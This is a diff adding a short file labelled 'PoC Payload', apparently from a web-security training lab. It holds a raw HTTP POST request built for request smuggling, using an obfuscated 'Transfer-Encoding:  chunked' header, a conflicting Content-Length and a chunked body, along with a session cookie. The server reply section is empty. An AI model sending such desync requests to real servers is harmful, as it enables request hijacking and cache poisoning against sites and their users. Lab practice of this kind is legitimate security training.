@@ -1,0 +1,19 @@
+Server reply
+-----------------------------
+
+PoC Payload
+------------------------------
+POST /?q=7243807910467417194 HTTP/1.1
+Host: 0afc007d04c694e8820092b1007e00ce.web-security-academy.net
+X: X
+Transfer-Encoding:  chunked
+Cookie: session=nFlJk5kNreuoMwrraHkbYQ0XFltuBD9G
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
+Connection: Keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+
+1
+G
+0
+
